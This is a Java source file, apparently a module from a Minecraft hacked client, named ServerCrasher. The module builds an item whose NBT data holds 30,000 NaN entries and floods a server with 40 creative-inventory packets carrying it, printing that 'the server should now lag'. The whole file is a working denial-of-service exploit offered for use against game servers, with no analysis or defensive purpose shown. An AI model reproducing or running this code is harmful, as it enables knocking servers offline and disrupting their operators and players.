package me.mees.remix.modules.exploit.servercrasher;

import me.satisfactory.base.module.*;
import me.mees.remix.modules.exploit.*;
import me.satisfactory.base.utils.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import net.minecraft.util.*;

public class Gamemode extends Mode<ServerCrasher>
{
    public Gamemode(final ServerCrasher parent) {
        super(parent, "Gamemode");
    }
    
    public void Test() {
        if (this.mc.playerController.isNotCreative()) {
            MiscellaneousUtil.sendInfo("In order for the crasher to work you have to be in GM 1!");
            return;
        }
        MiscellaneousUtil.sendInfo("The server should now lag!");
        final ItemStack itm = new ItemStack(Blocks.stone);
        final String crashText = "";
        final NBTTagCompound base = new NBTTagCompound();
        for (int i3 = 0; i3 < 30000; ++i3) {
            base.setDouble(String.valueOf(i3), Double.NaN);
        }
        itm.setTagCompound(base);
        for (int i3 = 0; i3 < 40; ++i3) {
            this.mc.thePlayer.sendQueue.sendPacketNoEvent(new C10PacketCreativeInventoryAction(i3, itm));
        }
    }
    
    @Override
    public void onEnable() {
        this.Test();
        super.onEnable();
    }
    
    @Override
    public void onDisable() {
        final Timer timer = this.mc.timer;
        Timer.timerSpeed = 1.0f;
        super.onDisable();
    }
}
